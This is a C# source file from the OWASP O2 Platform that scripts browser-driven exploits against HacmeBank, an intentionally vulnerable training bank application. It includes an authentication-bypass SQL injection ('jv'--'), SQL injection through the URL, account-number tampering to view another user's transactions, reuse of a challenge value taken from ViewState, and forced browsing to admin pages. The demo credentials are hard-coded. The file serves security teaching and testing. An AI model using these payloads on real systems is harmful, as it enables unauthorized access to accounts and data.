// This file is part of the OWASP O2 Platform (http://www.owasp.org/index.php/OWASP_O2_Platform) and is released under the Apache 2.0 License (http://www.apache.org/licenses/LICENSE-2.0)
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using O2.Interfaces.O2Core;
using O2.Kernel;
using O2.Kernel.ExtensionMethods;
using O2.DotNetWrappers.ExtensionMethods;
using SHDocVw;
using WatiN.Core; 
using O2.XRules.Database.APIs;

//O2File:Ref:WatiN_IE_ExtensionMethods.cs 
//O2Ref:Interop.SHDocVw.dll
//O2Ref:WatiN.Core.1x.dll
//O2File:DotNet_ViewState.cs
//O2Ref:Microsoft.mshtml.dll

namespace O2.XRules.Database.HacmeBank
{
    public class HacmeBank_BlackBox_Exploits
    {   
    	private string StartUrl {get; set;}
    	private WatiN_IE Browser {get; set;}
    	
    	public  HacmeBank_BlackBox_Exploits(WatiN_IE browser, string startUrl)
    	{
    		Browser = browser;
    		StartUrl = startUrl;    		
    	}
    	
    	public void open_HacmeBank_login_page()
    	{
    		Browser.open(StartUrl);    	    		
    	}
    	
    	public void login_Fail()
		{
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("Not Good").flash();
			Browser.field("txtPassword").value("BBBB").flash();
			Browser.button("Submit").flash().click();
		}
		
		public void login_as_JV()
		{
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").flash().click();
		}
		
		public void vulnerability_Sql_Injection_in_Login_page()
		{
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv ' aaa").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").flash().click();
		}
		
		public void vulnerability_Sql_Injection_in_Accounts_Details_page()
		{
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").flash().click();
			Browser.link("My Accounts").flash().click(); 
			Browser.link("View Transactions").flash().click();  
			Browser.open(Browser.url()+"' AAAAA "); 			
		}
    	 
    	public void vulnerability_Autorization_Bypass_in_Login_page()
		{
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv'--").flash();
			Browser.field("txtPassword").value("aaaa").flash();
			Browser.button("Submit").flash().click();
		} 
		
		public void vulnerability_Authentication_Failure_in_Accounts_Details_page()
		{
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").click();
			Browser.link("My Accounts").flash().click(); 
			Browser.link("View Transactions").flash().click();
			Browser.sleep(1000);
			var url = Browser.url();
			var payload = url.replace("5204320422040001","5204320422040003");
			Browser.open(payload);			
		}
		
		public void vulnerability_Sensitive_Information_Disclosure_in_Admin_Section()
		{
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").click();
			Browser.link("Admin Section").flash().click(); 					
			
			var response = Browser.viewState().ViewState_Values[12];
			
			Browser.field("_ctl3:txtResponse").value(response).flash();
			//Browser.set_Value("_ctl3:txtResponse", response).flash(); 
			Browser.button("Login").flash().click();
		}
		
		public void vulnerability_Autorization_Failure_on_Admin_Controls()
		{
			
			/*Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv");
			Browser.field("txtPassword").value("jv789");
			Browser.button("Submit").click();
			Browser.link("Admin Section").click(); 			
			var response = Browser.viewState().ViewState_Values[12];
			Browser.field("_ctl3:txtResponse").value(response);
			//Browser.set_Value("_ctl3:txtResponse", response).flash(); 
			Browser.button("Login").click();*/
			
			vulnerability_Sensitive_Information_Disclosure_in_Admin_Section();
			
			var adminPages = Browser.links().urls().filter("admin");
			
			Browser.link("Logout").click(); 
			
			login_as_JV();
			
			foreach(var page in adminPages)
			{
				Browser.open(page);
				Browser.sleep(2000);
			}
		}
    }
}
